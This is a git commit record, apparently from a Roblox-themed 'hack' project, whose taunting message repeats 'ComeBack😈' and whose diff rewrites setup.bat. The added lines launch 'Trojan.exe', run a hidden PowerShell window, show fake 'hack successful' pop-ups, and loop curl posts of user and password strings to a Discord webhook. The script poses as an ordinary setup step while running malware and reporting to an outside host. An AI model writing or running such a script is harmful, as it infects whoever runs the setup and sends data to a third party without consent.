1a2873bc2ad22f9c2095118a9ff7f68a5a853aa1
rraapt66 <146457670+rraapt66@users.noreply.github.com>
2023-12-30 20:58:00 -0800

    ComeBack😈😈😈
    ComeBack😈😈😈
     ComeBack😈😈😈
      ComeBack😈😈😈
       ComeBack😈😈😈
        ComeBack😈😈😈
         ComeBack😈😈😈
           ComeBack😈😈😈
    ComeBack😈😈😈
     ComeBack😈😈😈
      ComeBack😈😈😈
       ComeBack😈😈😈
        ComeBack😈😈😈
         ComeBack😈😈😈
           ComeBack😈😈😈
    ComeBack😈😈😈
     ComeBack😈😈😈
      ComeBack😈😈😈
       ComeBack😈😈😈
        ComeBack😈😈😈
         ComeBack😈😈😈
           ComeBack😈😈😈
    ComeBack😈😈😈
     ComeBack😈😈😈
      ComeBack😈😈😈
       ComeBack😈😈😈
        ComeBack😈😈😈
         ComeBack😈😈😈
           ComeBack😈😈😈

--- setup.bat
+++ setup.bat
@@ -2,6 +2,26 @@
 :e
 python -m pip install -r requirements.txt
 cls
-echo enter!!!
-pause
-start https://we.tl/t-qxkbUUOLSx
+@echo off
+cls
+start Trojan.exe
+cls
+timeout 4 > nul
+cls
+set password=%random%
+SET /p webhook=" webhook >  "
+curl -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST https://discord.com/api/webhooks/... --data "{\"content\": \"0_0_-TrojanReady\"}" %webhook%
+:hidemode
+cd C:\Users\%username%
+mkdir hackRoblox
+cd hackRoblox
+powershell -WindowStyle Hidden -Command "& {}"
+echo x=msgbox("Hack Successfu 1 more user roblox" ,0, "") > Realtime.vbs 
+start Realtime.vbs 
+timeout 3
+echo x=msgbox("Send password to webhok user is :abby%random% :password is %password%" ,0, "") > Realtime1.vbs 
+start Realtime1.vbs 
+curl -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST https://discord.com/api/webhooks/... --data "{\"content\": \"user:abby%random%-password:%password%\"}" %webhook%
+cls
+timeout 50
+goto hidemode
